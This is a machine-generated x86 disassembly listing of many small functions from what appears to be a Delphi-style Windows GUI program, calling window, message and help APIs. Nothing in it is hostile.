sub_43667c
push ebx
mov ebx eax
mov eax ebx
call sub_436ed8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_436ec7
jmp sub_403a98
sub_436ed8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_4282c0
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43664c
sub_436f2f
jmp sub_403a98
sub_436f36
pop ebp
retn
sub_436f38
sub [ rw-data ] 0x1
retn
sub_439cc3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x40c5172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43a07e
jmp sub_403a98
sub_43a085
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a10a
jmp sub_403a98
sub_43a111
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a118
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_445644
pop ebx
retn
sub_43a12c
push ebx
mov ebx eax
mov eax ebx
call sub_44839c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_445644
pop ebx
retn
sub_43a148
push ebx
mov ebx eax
mov eax ebx
call sub_447370
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43a1f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442550
pop esi
pop ebx
retn
sub_43a35e
jmp sub_403a98
sub_43a365
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a474
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_444658
mov eax ebx
mov si 0xffc7
call sub_403540
pop esi
pop ebx
retn
sub_43a560
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a57c
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403540
sub_43a598
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43a5a4
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419e80
sub_43a5b8
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a618
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a68c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403540
pop esi
pop ebx
retn
sub_43a6a8
push esi
mov esi eax
mov eax esi
call sub_444164
mov eax esi
mov si 0xffc7
call sub_403540
pop esi
retn
sub_43a74d
jmp sub_403a98
sub_43a754
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a75c
push ebx
mov ebx eax
mov eax ebx
call sub_4442c8
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_43a780
push ebx
mov ebx eax
mov eax ebx
call sub_4442e0
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_43a86c
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_43ae94
sub_43a880
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_43ae94
mov eax ebx
call sub_446324
sub_43a8a4
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_446324
sub_43a8b8
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_446324
sub_43a8fc
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_446324
sub_43a9fd
jmp sub_403a98
sub_43aa04
pop ebx
pop ecx
pop ebp
retn
sub_43ab1c
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_448d84
push eax
call SetWindowTextA
pop ebx
retn
sub_43ab38
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop ebx
retn
sub_43ab54
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_448d84
push eax
call SendMessageA
pop ebx
retn
sub_43abfa
jmp sub_403a98
sub_43ac01
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ac9a
jmp sub_403a98
sub_43ae13
jmp sub_403a98
sub_43ae78
push ebx
mov ebx eax
mov eax ebx
call sub_43a910
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_446120
pop ebx
retn
sub_43af78
push ebx
mov ebx eax
mov eax ebx
call sub_44215c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_43b070
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403540
sub_43b1d2
jmp sub_403a98
sub_43b27c
mov eax [ r-xdata ]
retn
sub_43b284
xor eax eax
retn
sub_43b2a8
retn
sub_43b3c0
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_446324
sub_43b438
push ebx
mov ebx eax
mov eax ebx
call sub_45a2f0
test eax eax
je r-xdata
mov eax ebx
call sub_443ad8
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_43b45c
xor eax eax
retn
sub_43b523
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x57f1173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_43b53c
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403540
sub_43b62d
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_43b636
jmp sub_403a98
j_sub_43b62d
jmp sub_43b62d
sub_43b63d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b770
mov al [ eax + 0x211 ]
retn
sub_43b7a4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_446324
sub_43b984
call sub_446324
retn
sub_43ba01
jmp sub_403a98
sub_43ba08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43bdcb
jmp sub_403a98
sub_43bdd2
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_43bddc
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_43bc94
retn
sub_43be48
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_43bc94
retn
sub_43be60
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_43bc94
retn
sub_43be74
push ebx
mov ebx eax
mov eax ebx
call sub_44215c
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_43be98
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43bfd0
call sub_43beb8
retn
sub_43bfd8
call sub_43beb8
retn
sub_43c008
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_43c035
jmp sub_403a98
sub_43c03c
pop ebp
retn
sub_43c040
sub [ rw-data ] 0x1
retn
sub_43c19d
jmp sub_403a98
sub_43c1a4
pop ebp
retn
sub_43c1a8
sub [ rw-data ] 0x1
retn
sub_43c1b0
inc esi
dec ecx
add ch ah
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_43ca28
sub_43c1c1
add eax 0xffffffe0
jmp sub_43c7a8
sub_43c1c9
add eax 0xffffffe0
jmp sub_43c810
sub_43c1d1
add eax 0xffffffe0
jmp sub_43c924
sub_43c1d9
add eax 0xffffffe0
jmp sub_43c998
sub_43c1e1
add eax 0xffffffe0
jmp sub_43c454
sub_43c1e9
add eax 0xffffffe0
jmp sub_43c468
sub_43c1f1
add eax 0xffffffe0
jmp sub_43c4e0
sub_43c1f9
add eax 0xffffffe0
jmp sub_43c584
sub_43c201
add eax 0xffffffe0
jmp sub_43c588
sub_43c209
add eax 0xffffffe0
jmp sub_43c610
sub_43c211
add eax 0xffffffe0
jmp sub_43c758
sub_43c219
add eax 0xffffffe0
jmp sub_43c75c
sub_43c221
add eax 0xffffffe0
jmp sub_43c778
sub_43c233
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4058b4
sub_43c23d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4058c8
sub_43c248
sub edx eax
inc ebx
add [ ebx ] dh
retn 0x43
sub_43c250
cmp eax 0xe10043c2
rol [ ebx ] 0xe9
rol [ ebx ] 0xf1
rol [ ebx ] 0xf9
rol [ ebx ] 0x1
retn 0x43
sub_43c270
sbb edx eax
inc ebx
add [ ecx ] ah
retn 0x43
sub_43c2e8
mov edx es
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] dh
retn
sub_43c411
jmp sub_403a98
sub_43c418
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c454
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_4040e8
pop ebx
retn
sub_43c4cf
jmp sub_403a98
sub_43c4d6
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c568
jmp sub_403a98
sub_43c56f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c584
mov al 0x1
retn
sub_43c603
jmp sub_403a98
sub_43c60a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c708
jmp sub_403a98
sub_43c70f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c758
mov [ eax + 0xc ] edx
retn
sub_43c75c
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43c800
jmp sub_403a98
sub_43c807
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43c906
jmp sub_403a98
sub_43c90d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c986
jmp sub_403a98
sub_43c98d
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ca18
jmp sub_403a98
sub_43ca1f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43cb13
jmp sub_403a98
sub_43cb1a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43cbdc
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43cb28
call EnumWindows
retn
sub_43cc6e
jmp sub_403a98
sub_43cc75
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43cc80
xor eax eax
retn
sub_43cd79
jmp sub_403a98
sub_43cd80
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ce6a
jmp sub_403a98
sub_43ce71
pop ebp
retn
sub_43cec6
jmp sub_403a98
sub_43cecd
pop ebp
retn
sub_43e050
jmp r-xdata
sub_43e052
0xe8ffe9ff 0xe7ff
sub_43e059
jmp esi
sub_43f2dc
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43f5ef
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413e1c
retn
sub_43f60c
push 0x15
mov ecx rw-data
call sub_413ddc
retn
sub_43f6f8
call GetCapture
call sub_43f3dc
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43f95c
push ebx
push eax
push sub_43fae0
call sub_41aefc
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43f974
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43f9a4
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41afb0
pop ebx
retn
sub_43fa82
jmp sub_4037e4
sub_43fab4
xor eax eax
retn
sub_43fab8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43fad0
retn
sub_43fad4
mov eax [ rw-data ]
retn
sub_43fadc
retn
sub_43fb0a
jmp sub_4037e4
sub_43fb0f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fb2c
call sub_40359c
xor eax eax
mov [ rw-data ] eax
retn
sub_43fb3c
call sub_403598
xor eax eax
mov [ rw-data ] eax
retn
sub_43fb4c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_43fbfc
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43fc14
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43fc60
retn
sub_43fe18
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403540
pop esi
retn
sub_43fe2c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403540
pop esi
retn
sub_43fe40
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43fe4c
mov eax 0x4
retn
sub_43fe54
retn
sub_440a45
jmp sub_4037e4
sub_440d32
jmp sub_403a98
sub_440da4
jmp sub_403a98
sub_440db0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_440ad8
sub_440f2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e108
retn
sub_440f45
jmp sub_403a98
sub_440f6c
jmp sub_403a98
sub_440fee
jmp sub_403a98
sub_441016
jmp sub_403a98
sub_44101d
mov esp ebp
pop ebp
retn
sub_4410d5
jmp sub_403a98
sub_44112c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4410f8
mov [ ebx + 0x58 ] esi
sub_441280
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_441294
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44137d
jmp sub_403a98
sub_441384
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441407
jmp sub_403a98
sub_44140e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4417dc
xor eax eax
retn
sub_4417e0
mov al [ eax + 0x58 ]
retn
sub_4417e4
xor eax eax
retn
sub_4417e8
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_4417f0
mov eax [ eax + 0x30 ]
retn
sub_441894
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_441940
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_441958
mov [ eax + 0x5d ] dl
retn
sub_44195c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_445588
sub_44196c
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_441e4f
jmp sub_403a98
sub_441e56
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441eb8
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_441f3c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_442059
jmp sub_403a98
sub_442060
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44215c
push eax
xor ecx ecx
mov edx 0xb037
call sub_443750
retn
sub_44231d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403540
sub_4423ce
jmp sub_403a98
sub_4423d5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4424ac
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_443750
sub_4424c4
push 0x0
xor ecx ecx
mov edx 0xe
call sub_443750
retn
sub_4424d4
push edx
mov edx 0xd
call sub_443750
retn
sub_4424e0
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_4424f4
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_4425d5
jmp sub_403a98
sub_4425dc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4425e4
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_443750
sub_442654
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_442668
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_442674
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_44267c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_443750
sub_4426a0
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_443750
sub_4426c4
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_443750
sub_44270c
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_442714
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_443750
sub_442738
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_443750
sub_442778
push ebx
mov ebx eax
call sub_43f6f8
cmp ebx eax
sete al
pop ebx
retn
sub_4427b0
push esi
mov dl 0x1
mov si 0xffce
call sub_403540
pop esi
retn
sub_4428fa
jmp sub_403a98
sub_442901
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442a24
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_442998
retn
sub_442a78
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_442a8c
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_442b71
jmp sub_403a98
sub_442b90
xor eax eax
retn
sub_442b94
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_442bac
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_442bc4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_442bdc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_442bf8
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_442c10
retn
sub_442d08
retn
sub_442d0c
cmp eax [ rw-data ]
sete al
retn
sub_442d80
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_442e9c
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403540
pop esi
pop ebp
retn 0x4
sub_442edc
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_443173
jmp sub_403a98
sub_44317a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443184
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403540
pop esi
retn
sub_443198
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403540
pop esi
retn
sub_443467
jmp sub_403a98
sub_443510
push esi
mov si 0xffee
call sub_403540
pop esi
retn
sub_44351c
mov al 0x1
retn
sub_4437f4
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_441ba4
retn
sub_443818
retn
sub_443a31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_4176cc
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_443a4c
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419a04
retn
sub_443b44
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44415c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_444164
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44416c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_444224
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444244
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4426a0
mov [ ebx + 0x9a ] 0x1
sub_44429c
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_442644
mov [ ebx + 0x56 ] 0x1
sub_4442c0
mov [ edx + 0xc ] 0x1
retn
sub_4442c8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_443750
sub_4442e0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_443750
sub_4442f8
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_44455e
jmp sub_403a98
sub_444565
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444590
mov eax [ r-xdata ]
retn
sub_44472c
jmp sub_403a98
sub_444733
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444854
mov eax [ eax + 0xb8 ]
retn
sub_4448bc
push ebx
mov ebx eax
mov eax ebx
call sub_442bac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_4448d8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_444a70
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_444aa0
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_444aa8
call sub_441610
retn
sub_444ba8
jmp sub_403a98
sub_444d68
jmp sub_403a98
sub_444db8
jmp sub_403a98
sub_444df0
retn
sub_445079
jmp sub_403a98
sub_445201
jmp sub_403a98
sub_445563
jmp sub_403a98
sub_44560f
jmp sub_403a98
sub_44561c
inc [ eax + 0x160 ]
retn
sub_445624
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_445644
sub_445644
xor edx edx
call sub_445588
retn
sub_445711
jmp sub_403a98
sub_445718
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445807
jmp sub_403a98
sub_445d2e
jmp sub_403a98
sub_445d35
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445efd
jmp sub_403a98
sub_445f04
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445fd8
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4461c5
jmp sub_403a98
sub_4461cc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4462bc
xor eax eax
retn
sub_446324
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_443750
j_sub_4037e4#9
jmp sub_4037e4
sub_446587
jmp sub_403a98
sub_44658e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446598
jmp sub_4037e4
sub_44659d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46321c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446b58
jmp sub_403a98
sub_446b5f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b68
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_447066
jmp sub_403a98
sub_4470b8
push ebx
mov ebx eax
call sub_41c828
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_443750
pop ebx
retn
sub_4470d4
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_443750
retn
sub_4470e8
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_443750
retn
sub_4470f8
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_443750
retn
sub_4473a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_449094
pop esi
retn
sub_4474b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
